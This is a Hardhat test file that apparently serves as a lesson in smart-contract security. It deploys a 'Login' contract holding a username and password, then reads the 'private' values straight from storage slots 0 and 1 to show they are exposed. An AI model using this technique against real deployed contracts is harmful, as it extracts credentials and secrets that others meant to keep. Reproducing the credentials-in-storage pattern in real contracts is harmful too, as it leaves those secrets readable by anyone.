const { ethers } = require("hardhat");
const { expect } = require("chai");


describe("Login Attack", function() {
    it("Should be able to read the private variables password and username", async function () {

        // Deploy the login Contract
        const loginFactory = await ethers.getContractFactory("Login");

        // TO save space, we would conver the string to bytes32 array
        const usernameBytes = ethers.utils.formatBytes32String("Billy");
        const passwordBytes = ethers.utils.formatBytes32String("billy@123");

        const loginContract = await loginFactory.deploy(
            usernameBytes,
            passwordBytes
        );
        await loginContract.deployed();

        // Get the storage at storage slot 0,1
        const slot0Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            0
        );
        const slot1Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            1
        );
        
        console.log(ethers.utils.parseBytes32String(slot0Bytes));
        console.log(ethers.utils.parseBytes32String(slot1Bytes));
        // We are able to extract the values of the private variables
        expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("Billy");
        expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("billy@123");
    });
});